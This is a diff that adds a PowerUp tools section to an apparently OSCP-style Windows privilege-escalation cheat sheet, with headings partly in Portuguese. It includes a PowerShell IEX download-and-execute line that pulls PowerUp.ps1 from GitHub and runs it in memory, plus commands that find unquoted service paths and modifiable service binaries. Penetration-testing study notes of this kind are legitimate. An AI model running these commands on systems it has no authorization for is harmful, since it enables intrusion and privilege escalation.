@@ -852,6 +852,24 @@ Seatbelt.exe -group=all
 .\Seatbelt.exe -group=all
 ```
 # PRIVILEGE ESCALATION WINDOWS
+## TOOLS
+##### POWERUP
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1")
+```
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1  -Outfile PowerUp.ps1
+import-module .\PowerUp.ps1
+```
+ACHAR UNQUOTED SERVICE
+```
+Get-Serviceunquoted -Verbose
+```
+ACHAR SERVIÇOS ONDE O USUARIO ATUAL PODE ALTERAR O BINARIO OU MUDAR OS ARGUMENTOS
+```
+Get-ModifiableServiceFiles -Verbose
+```
+
 ## TECHNIQUES
 ##### ALWAYS ELEVATED(1)
 ```
